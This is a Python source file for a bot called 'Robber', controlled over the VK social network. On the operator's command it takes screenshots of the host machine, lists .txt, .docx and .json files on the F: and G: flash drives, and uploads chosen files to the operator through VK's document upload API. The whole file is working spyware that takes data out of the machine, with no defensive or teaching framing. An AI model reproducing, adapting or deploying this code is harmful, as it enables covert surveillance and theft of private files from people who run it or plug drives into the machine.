import config
import vk_api
from vk_api.longpoll import VkLongPoll, VkEventType
from vk_api.keyboard import VkKeyboard
from requests import post
from pyautogui import screenshot
from datetime import datetime
from json import loads
from os import startfile, walk, remove
from os.path import join, isdir, basename
from time import time
from sys import exit

class Robber(vk_api.VkApi):

	def __init__(self):

		super().__init__(token=config.group_token)
		self.upload = vk_api.VkUpload(self)

		self.start_working_time = time()
		self.file_names = {}
		self.screenshot_name = 'screenshot.png'
		self.screenshot_count = 0
		self.copied_files = 0
		self.doc_send_error = False

		self.main_menu_buttons = {
								'Scan flash-disk' : 'primary',
								'Screenshot' : 'primary',
								'Bot\'s condition' : 'primary',
								'< ---------- >' : 'secondary',
								'Turn off' : 'negative'
								 }

	def __enter__(self):

		self.send_message(user_id=config.my_id, message='Robber was started')

		return self

	def __exit__(self, *args):

		self.send_message(user_id=config.my_id, message='Robber was turned off')

	def get_condition(self):

		fd_files = ''

		if self.file_names:
			fd_files += self.file_names['scan_time'] + '\n\n'
			for key, value in self.file_names.items():
				if key != 'scan_time':
					fd_files += f'{key}. {basename(value)}\n'
		else:
			fd_files += 'No actual flash-disks files. Scan it'

		return (f'Working time: {round(time() - self.start_working_time)}s\n'
				f'Done screenshots: {self.screenshot_count}\n'
				f'Copied files: {self.copied_files}\n'
				f'Flash-disks files:\n\n{fd_files}')

	def get_answer(self, text):

		if text == 'Scan flash-disk':
			answer = self.scan_flash_disk()
		elif text == 'Screenshot':
			answer = str(datetime.now().strftime('%d.%m.%Y %H:%M:%S'))
		elif text == 'Bot\'s condition':
			answer = self.get_condition()
		elif text.startswith('/'):
			if not self.doc_send_error:
				answer = str(datetime.now().strftime('%d.%m.%Y %H:%M:%S'))
			else:
				answer = 'Incorrect file-key'
				self.doc_send_error = True 
		elif text == 'Turn off':
			exit()
		else:
			answer = 'Unknow command'

		return answer

	def get_keyboard(self):

		keyboard = VkKeyboard()

		for label, color in self.main_menu_buttons.items():
			keyboard.add_button(label=label, color=color)
			if label != list(self.main_menu_buttons)[-1]:
				keyboard.add_line()

		return keyboard.get_keyboard()

	def get_attachment(self, text):

		if text == 'Screenshot':
			attachment = self.get_screenshot()
			attachment_type = 'screenshot'
			self.screenshot_count += 1
		elif text.startswith('/'):
			attachment = self.get_doc(text[1:])
			attachment_type = 'doc'
			self.copied_files += 1
		else:
			attachment = ''
			attachment_type = None

		return (attachment, attachment_type)

	def send_message(self, **kwargs):

		kwargs.update({'random_id' : 0})

		self.method('messages.send', kwargs)

	def check_messages(self):

		longpoll = VkLongPoll(self)

		for event in longpoll.listen():
			if event.type == VkEventType.MESSAGE_NEW and event.to_me:
				if event.user_id == config.my_id:
					self.message_callback(event.user_id, event.text)

	def message_callback(self, id, text):

		attachment, attachment_type = self.get_attachment(text) # [0] - attach, [1] - attach type
		message = self.get_answer(text)
		keyboard = self.get_keyboard()

		self.send_message(user_id=id, message=message, keyboard=keyboard, attachment=attachment)

		if attachment_type == 'screenshot':
			try:
				remove(self.screenshot_name)
			except FileNotFoundError:
				pass

	# < ---------------------------------------- >

	def do_screenshot(self):

		screenshot(self.screenshot_name)

	def get_screenshot(self):

		self.do_screenshot()

		photo = self.upload.photo_messages(self.screenshot_name)

		owner_id = photo[0]['owner_id']
		photo_id = photo[0]['id']

		attachment = f'photo{owner_id}_{photo_id}'

		return attachment

	def scan_flash_disk(self):

		show_data = ''
		total_files_count = 0

		if not self.file_names:
			self.file_names.clear()

		if isdir('F:\\'):

			F_files_count = 0
			show_data += 'F:\\\n'

			for adress, dirs, files in walk('F:\\'):
				for file in files:
					if file.endswith('.txt') or file.endswith('.docx') or file.endswith('.json'):
						F_files_count += 1
						total_files_count += 1
						show_data += f'{total_files_count}. {file}\n'
						self.file_names.update({total_files_count : join(adress, file)})

			if not F_files_count:
				show_data += 'no files'

		if isdir('G:\\'):

			G_files_count = 0
			show_data += '\nG:\\\n'

			for adress, dirs, files in walk('G:\\'):
				for file in files:
					if file.endswith('.txt') or file.endswith('.docx') or file.endswith('.json'):
						G_files_count += 1
						total_files_count += 1
						show_data += f'{total_files_count}. {file}\n'
						self.file_names.update({total_files_count : join(adress, file)})

			if not G_files_count:
				show_data += 'no files'

		if not show_data:
			show_data += 'Flash-disks was not founded'
		else:
			now_time = str(datetime.now().strftime('%d.%m.%Y %H:%M:%S'))
			self.file_names.update({'scan_time' : now_time})
			show_data = f'{now_time}\n\n' + show_data + '\nUse the \'/\' to correctly send the key'		

		return show_data

	def get_doc(self, text):

		try:
			key = int(text)

			upload_server = self.method('docs.getMessagesUploadServer', {'type' : 'doc', 'peer_id' : config.my_id})['upload_url']

			file = loads(post(upload_server, files={'file' : open(self.file_names[key], 'rb')}).text)['file']
			doc = self.method('docs.save', {'file' : file, 'title' : 'Document', 'tags' : []})

			owner_id = doc['doc']['owner_id']
			doc_id = doc['doc']['id']

			attachment = f'doc{owner_id}_{doc_id}'

		except (ValueError, KeyError):

			self.doc_send_error = True
			self.send_message(user_id=config.my_id, message='Error while sending the file.')
			attachment = ''

		finally:

			return attachment

	def start(self):

		self.check_messages()
		# self.send_message(message=open(r'C:\Users\gsw\projects\laptops\laptops.txt').read(), user_id=config.my_id)

if __name__ == '__main__':

	try:
		with Robber() as robber:
			robber.start()
	except (KeyboardInterrupt, SystemExit):
		exit()
